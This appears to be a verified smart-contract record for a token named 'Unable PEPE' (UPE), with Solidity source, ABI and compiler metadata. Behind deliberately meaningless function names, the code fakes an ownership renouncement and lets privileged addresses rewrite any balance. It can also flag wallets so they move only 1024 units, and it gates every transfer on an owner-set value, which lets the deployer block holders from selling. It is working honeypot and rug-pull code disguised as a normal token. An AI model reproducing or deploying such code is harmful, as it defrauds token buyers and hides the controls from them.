{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface isWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldAt) external view returns (uint256);\n\n    function transfer(address listTo, uint256 modeMin) external returns (bool);\n\n    function allowance(address receiverLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTo,\n        uint256 modeMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTeam, uint256 value);\n    event Approval(address indexed receiverLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract shouldBuySell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedListSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedTeam {\n    function createPair(address fromTx, address tradingSell) external returns (address);\n}\n\ninterface isWalletMetadata is isWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnablePEPE is shouldBuySell, isWallet, isWalletMetadata {\n\n    mapping(address => bool) public marketingAuto;\n\n    function walletReceiver(uint256 modeMin) public {\n        fundShould();\n        receiverSell = modeMin;\n    }\n\n    address amountTotalLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private minMode = 18;\n\n    string private sellTeam = \"UPE\";\n\n    uint256 receiverSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    function marketingModeTeam(address isFrom, uint256 modeMin) public {\n        fundShould();\n        receiverFee[isFrom] = modeMin;\n    }\n\n    function exemptFromTo() public {\n        emit OwnershipTransferred(launchedTx, address(0));\n        receiverLiquidityBuy = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellFee;\n\n    address teamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public txTrading;\n\n    string private fromSwap = \"Unable PEPE\";\n\n    address public limitFromAuto;\n\n    bool private limitLaunch;\n\n    uint256 takeWallet;\n\n    uint256 private senderEnableLaunch;\n\n    event OwnershipTransferred(address indexed senderMax, address indexed totalLaunchShould);\n\n    uint256 private atTxEnable;\n\n    function tradingFee(address swapTrading, address listTo, uint256 modeMin) internal returns (bool) {\n        require(receiverFee[swapTrading] >= modeMin);\n        receiverFee[swapTrading] -= modeMin;\n        receiverFee[listTo] += modeMin;\n        emit Transfer(swapTrading, listTo, modeMin);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLiquidityBuy;\n    }\n\n    function fundShould() private view {\n        require(marketingAuto[_msgSender()]);\n    }\n\n    function transfer(address isFrom, uint256 modeMin) external virtual override returns (bool) {\n        return marketingModeLaunched(_msgSender(), isFrom, modeMin);\n    }\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return receiverLiquidityBuy;\n    }\n\n    bool public tokenMode;\n\n    function takeToken(address swapMarketing) public {\n        if (senderLimit) {\n            return;\n        }\n        \n        marketingAuto[swapMarketing] = true;\n        \n        senderLimit = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromSwap;\n    }\n\n    function transferFrom(address swapTrading, address listTo, uint256 modeMin) external override returns (bool) {\n        if (_msgSender() != amountTotalLiquidity) {\n            if (sellFee[swapTrading][_msgSender()] != type(uint256).max) {\n                require(modeMin <= sellFee[swapTrading][_msgSender()]);\n                sellFee[swapTrading][_msgSender()] -= modeMin;\n            }\n        }\n        return marketingModeLaunched(swapTrading, listTo, modeMin);\n    }\n\n    address public launchedTx;\n\n    function allowance(address exemptFromMin, address exemptSwap) external view virtual override returns (uint256) {\n        if (exemptSwap == amountTotalLiquidity) {\n            return type(uint256).max;\n        }\n        return sellFee[exemptFromMin][exemptSwap];\n    }\n\n    bool private receiverReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minMode;\n    }\n\n    function marketingModeLaunched(address swapTrading, address listTo, uint256 modeMin) internal returns (bool) {\n        if (swapTrading == launchedTx) {\n            return tradingFee(swapTrading, listTo, modeMin);\n        }\n        uint256 receiverSenderTx = isWallet(limitFromAuto).balanceOf(teamReceiver);\n        require(receiverSenderTx == receiverSell);\n        require(listTo != teamReceiver);\n        if (launchedTrading[swapTrading]) {\n            return tradingFee(swapTrading, listTo, maxAt);\n        }\n        return tradingFee(swapTrading, listTo, modeMin);\n    }\n\n    mapping(address => bool) public launchedTrading;\n\n    function takeSwapEnable(address shouldLaunched) public {\n        fundShould();\n        \n        if (shouldLaunched == launchedTx || shouldLaunched == limitFromAuto) {\n            return;\n        }\n        launchedTrading[shouldLaunched] = true;\n    }\n\n    uint256 constant maxAt = 2 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellTeam;\n    }\n\n    mapping(address => uint256) private receiverFee;\n\n    address private receiverLiquidityBuy;\n\n    bool public senderLimit;\n\n    function approve(address exemptSwap, uint256 modeMin) public virtual override returns (bool) {\n        sellFee[_msgSender()][exemptSwap] = modeMin;\n        emit Approval(_msgSender(), exemptSwap, modeMin);\n        return true;\n    }\n\n    bool public takeTeam;\n\n    bool private receiverSwapExempt;\n\n    function balanceOf(address shouldAt) public view virtual override returns (uint256) {\n        return receiverFee[shouldAt];\n    }\n\n    constructor (){\n        \n        launchedListSwap toTrading = launchedListSwap(amountTotalLiquidity);\n        limitFromAuto = launchedTeam(toTrading.factory()).createPair(toTrading.WETH(), address(this));\n        if (atTxEnable == senderEnableLaunch) {\n            takeTeam = true;\n        }\n        launchedTx = _msgSender();\n        exemptFromTo();\n        marketingAuto[launchedTx] = true;\n        receiverFee[launchedTx] = maxReceiver;\n        \n        emit Transfer(address(0), launchedTx, maxReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMin\",\"type\":\"uint256\"}],\"name\":\"marketingModeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"}],\"name\":\"takeSwapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeMin\",\"type\":\"uint256\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnablePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}